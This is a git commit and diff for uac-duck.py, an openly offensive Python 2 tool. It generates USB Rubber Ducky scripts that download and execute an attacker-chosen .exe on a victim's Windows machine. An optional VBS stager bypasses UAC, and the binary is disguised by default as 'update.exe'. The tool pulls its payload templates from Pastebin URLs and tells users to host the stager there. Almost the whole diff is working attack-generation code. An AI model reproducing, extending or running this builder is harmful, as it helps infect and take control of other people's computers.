d8635032dacc4b58d8cf1ae814e69f14db278107
SkiddieTech <skiddie@tutanota.com>
2016-11-29 01:59:25 +0100

    Major update
    Major update, no need to make this more complicated, so i made it much
    more lightweight and easy to use, you now only have 2 options, gen a
    normal download and execute, or gen one with UAC bypass.

--- uac-duck.py
+++ uac-duck.py
@@ -43,19 +43,91 @@ def duckencodedownload():
 		main()	
 	else:
 		print "Please answer Yes(y) or No(n)"
+
+		
+def genuac():
+	if os.path.isfile('UAC-Duck-Payload.vbs'):
+		os.remove('UAC-Duck-Payload.vbs')
+		
+	print "-> Ducky D&E Blazing fast payload (WITH  UAC bypass) <- "
+	print "[+]Please input your binary payload direct link URL( www.example.com/pay.exe):"
+	genpayon_url = raw_input().lower()
 	
+	print "[+]Please input your Payload save filename (Deafult: update.exe):"
+	genpayon_name = raw_input().lower()
+	
+	if not genpayon_name:
+		print 'Using deafult params' 
+		with open('UAC-Duck-Payload.vbs', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
+			txt = txt.replace('[URL]', genpayon_url)
+			txt = txt.replace('[NAME]', "update.exe")
+			the_file.write(txt)
+		print "Payload UAC-Duck-Payload.vbs generated!"
+		print "Please upload this .vbs file as raw text format to a webserver(Pastebin works great)"
+		time.sleep(2)
+		genscripton()
+	elif genpayon_name.endswith(".exe") and genpayon_url.endswith(".exe"):
+		with open('UAC-Duck-Payload.vbs', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
+			txt = txt.replace('[URL]', genpayon_url)
+			txt = txt.replace('[NAME]', genpayon_name)
+			the_file.write(txt)
+		print "Payload UAC-Duck-Payload.vbs generated!"
+		print "Please upload this .vbs file as raw text format to a webserver(Pastebin works great)"
+		time.sleep(2)
+		genscripton()
+	else:
+		print "Please input a valid savename/URL ( Must end with .exe)"
+		genuac()
+		
+
+def gen():
+
+	if os.path.isfile('DuckyScript.txt'):
+		os.remove('DuckyScript.txt')
+		
+	print "-> Ducky D&E Blazing fast payload (Without UAC bypass) <- "
+	print "[+]Please input your binary payload direct link URL( www.example.com/pay.exe):"
+	genpayon_url = raw_input().lower()
+	
+	print "[+]Please input your Payload save filename (Deafult: update.exe):"
+	genpayon_name = raw_input().lower()
+	
+	if not genpayon_name:
+		print 'Using deafult params' 
+		with open('DuckyScript.txt', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
+			txt = txt.replace('[URL]', genpayon_url)
+			txt = txt.replace('[NAME]', "update.exe")
+			the_file.write(txt)
+		print 'Payload DuckyScript.txt generated!!' 
+		time.sleep(2)
+	elif genpayon_name.endswith(".exe") and genpayon_url.endswith(".exe"):
+		with open('DuckyScript.txt', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
+			txt = txt.replace('[URL]', genpayon_url)
+			txt = txt.replace('[NAME]', genpayon_name)
+			the_file.write(txt)
+		print 'Payload DuckyScript.txt generated!!' 
+		time.sleep(2)
+		duckencode()
+	else:
+		print "Please input a valid savename/URL ( Must end with .exe)"
+		gen()
+		
+		
 def genscripton():
 	if os.path.isfile('DuckyScript.txt'):
 		os.remove('DuckyScript.txt')
 		
-	print "-> Ducky payload [Online version] <- "
 	print "[+]Please input your UAC VBS Payload URL(Pastebin/RAW recommended):"
 	genpayon_url = raw_input().lower()
 	
 	print "[+]Please input your Payload save filename (Deafult: update.vbs):"
 	genpayon_name = raw_input().lower()
 	
-	if not genpayon_name:
+	if not genpayon_name and genpayon_url:
 		print 'Using deafult params' 
 		with open('DuckyScript.txt', 'a') as the_file:
 			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
@@ -64,7 +136,8 @@ def genscripton():
 			the_file.write(txt)
 		print 'Payload DuckyScript.txt generated!!' 
 		time.sleep(2)
-	elif genpayon_name.endswith(".vbs"):
+		duckencode()
+	elif genpayon_name.endswith(".vbs") and genpayon_url:
 		with open('DuckyScript.txt', 'a') as the_file:
 			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
 			txt = txt.replace('[URL]', genpayon_url)
@@ -72,71 +145,11 @@ def genscripton():
 			the_file.write(txt)
 		print 'Payload DuckyScript.txt generated!!' 
 		time.sleep(2)
+		duckencode()
 	else:
-		print "Please input a valid URL ( Must end with .vbs)"
+		print "Please input a valid URL"
 		genscripton()
 				
-	
-def genscriptoff():
-	print "Ducky payload [Offline version]"
-	print "Not yet released, will be coming soon"
-	main()
-	
-	
-def genpayon():
-	if os.path.isfile('UAC-Duck-Payload.vbs'):
-		os.remove('UAC-Duck-Payload.vbs')
-		
-	print "-> Ducky UAC payload [Online version] <- "
-	print "[+]Please input your binary Payload URL:"
-	genpayon_url = raw_input().lower()
-	
-	if genpayon_url.endswith(".exe"):
-		print "[+]Please input your Payload save filename (Deafult: update.exe):"
-		genpayon_name = raw_input().lower()
-		
-		if not genpayon_name:
-			print 'Using deafult params' 
-			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
-					txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
-					txt = txt.replace('[URL]', genpayon_url)
-					txt = txt.replace('[NAME]', "update.exe")
-					the_file.write(txt)
-			print "Payload UAC-Duck-Payload.vbs generated!"
-			time.sleep(2)
-		elif genpayon_name.endswith(".exe"):
-			
-			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
-				txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
-				txt = txt.replace('[URL]', genpayon_url)
-				txt = txt.replace('[NAME]', genpayon_name)
-				the_file.write(txt)
-			
-			print "Payload UAC-Duck-Payload.vbs generated! "
-			time.sleep(2)		
-		else:
-			print "Please input a valid filename ( filename.exe)"
-			genpayon()
-	else:
-		print "Please input a valid URL ( Must end with .exe)"
-		genpayon()
-		
-
-	
-def genpayoff():
-	print "Ducky UAC payload [Offline version]"
-	print "Not yet released, will coming ready soon"
-	main()
-
-def getcomon():
-	genpayon()
-	genscripton()
-	duckencode()
-
-def getcomoff():
-	print "Not yet released, will coming ready soon"
-	main()
-	
 	
 def main():
 	
@@ -153,35 +166,20 @@ def main():
 	print ""
 	print ""
 
-	print "[1] - Generate Rubber Ducky script [Online version]"
-	print "[2] - Generate Rubber Ducky script [Offline version]"
-	print "[3] - Generate Rubber Ducky UAC .vbs payload [Online version]"
-	print "[4] - Generate Rubber Ducky UAC .vbs payload [Offline version]"
-	print "[5] - Generate complete setup Script + Payload + Encode [Online version]"
-	print "[6] - Generate complete setup Script + Payload + Encode [Offline version]"
+	print "[1] - Generate binary download & execute ducky script (Without UAC bypass)"
+	print "[2] - Generate binary download & execute ducky script (With UAC bypass - 2 stager)"
 	
 	
 	choice = raw_input().lower()
 
-	scripton = set(['1','[1]'])
-	scriptoff = set(['2','[2]'])
-	payon = set(['3','[3]'])
-	payoff = set(['4','[4]'])
-	comon = set(['5','[5]'])
-	comoff = set(['6','[6]'])
+	DeNoUac = set(['1','[1]'])
+	DeUAC = set(['2','[2]'])
 
-	if choice in scripton:
-	   genscripton()
-	elif choice in scriptoff:
-	   genscriptoff()
-	elif choice in payon:
-	   genpayon()
-	elif choice in payoff:
-		genpayoff()
-	elif choice in comon:
-		getcomon()
-	elif choice in comoff:
-		getcomoff()
+
+	if choice in DeNoUac:
+	   gen()
+	elif choice in DeUAC:
+	   genuac()
 	else:
 	   print "Please input a number corresponding with your choose(1,2,3,4)"
 		
